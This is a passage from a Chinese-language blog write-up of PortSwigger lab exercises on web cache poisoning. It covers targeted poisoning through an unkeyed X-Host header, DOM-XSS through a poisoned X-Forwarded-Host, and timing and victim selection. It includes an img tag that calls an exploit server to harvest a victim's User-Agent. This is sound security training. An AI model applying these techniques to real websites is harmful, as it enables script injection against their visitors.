<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210517210148005.png" alt="image-20210517210148005"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><ol start="4">
<li>不唯一存在的缓存键</li>
</ol>
<p>当服务器通过vary指定内容不唯一的缓存键时，需要先通过其它的方式先获取到缓存键，再通过指定的缓存键的内容来进行投毒</p>
<p>题目：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-targeted-using-an-unknown-header">Lab: Targeted web cache poisoning using an unknown header</a></p>
<p>使用Param Miner工具寻找特殊的非缓存键，在这里的非缓存键时<code>X-host</code>字段，可以指定页面的域名。</p>
<p>从服务器的返回头部可知，vary字段指定了User-Agent为缓存键，所以如果要对目标用户进行投毒的话，需要知道它的User-Agent。</p>
<ul>
<li>在这里可以通过评论一个图片，将图片中的链接改为收集到的Header地址，这样就可以收集到目标用户的Header，再通过指定Header进行投毒。</li>
</ul>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210518165722642.png" alt="image-20210517220326393"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;https://acb71f541f33cc1080194fce018800fc.web-security-academy.net/exploit&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210517220326393.png" alt="image-20210517221230239"></p>
<ul>
<li>对主页进行投毒</li>
</ul>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210516222816285.png" alt="image-20210517222922776"></p>
<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><ol start="5">
<li>DOM-XSS</li>
</ol>
<p>题目：<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria">Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria</a></p>
<p><code>DOM-XSS</code>是一种特殊类型的反射型xss，它是基于DOM文档对象的一种漏洞，主要是因为客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行</p>
<p>这里同样也需要通过Param-Miner工具寻找一个可利用的字段。</p>
<p>因为这里页面通过<code>X-Forwarded-Host--用来确定客户端发出请求中使用host指定的初始域名</code>字段来设置data数据中的host字段。这个地段在之后用作json数据的来源的地址。</p>
<ul>
<li>这段js用来获取用户的地区，并且会将json中的数据通过DOM的方式写在页面之中</li>
</ul>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210518165611027.png" alt="image-20210518165722642"></p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210518165105852.png" alt="image-20210518165611027"></p>
<ul>
<li><p>构造payload</p>
<p>  通过构造<code>X-Forwarded-Host</code>字段对<code>data.host</code>进行投毒</p>
<p>  这里需要注意的是在head部分需要添加上<code>Access-Control-Allow-Origin: *</code>字段以设置CORS，否则js无法获得非同源的数据</p>
</li>
</ul>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210517222922776.png" alt="image-20210518165105852"></p>
<ul>
<li>访问页面进行投毒</li>
</ul>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210518170920515.png" alt="image-20210518170920515"></p>
<h4 id="在实际投毒之中需要注意的问题"><a href="#在实际投毒之中需要注意的问题" class="headerlink" title="在实际投毒之中需要注意的问题"></a>在实际投毒之中需要注意的问题</h4><h5 id="投毒的时机"><a href="#投毒的时机" class="headerlink" title="投毒的时机"></a>投毒的时机</h5><p>需要确保在缓存的响应过期后发送发送请求第一个到达主页，可以采用burp intruder或者自定义的大量请求的脚本，但是这种方法过于笨重。可以通过对目标的缓存到期系统进行逆向工程并通过浏览文档和监控网站来预测准确的到期时间来解决这个问题，在请求头中，有一个非缓存键输入 – X-Host请求头 – 被用于生成一个脚本导入的标签。响应头“Age”和“max-age”分别指定当前响应的时间和它将过期的时间。</p>
<p>可以利用这些信息确定发送payload的确定的时间</p>
<h5 id="选择性投毒"><a href="#选择性投毒" class="headerlink" title="选择性投毒"></a>选择性投毒</h5><p>通过确定的User-Agent来确定会被接收到攻击的访问者</p>
]]></content>
  </entry>
</search>
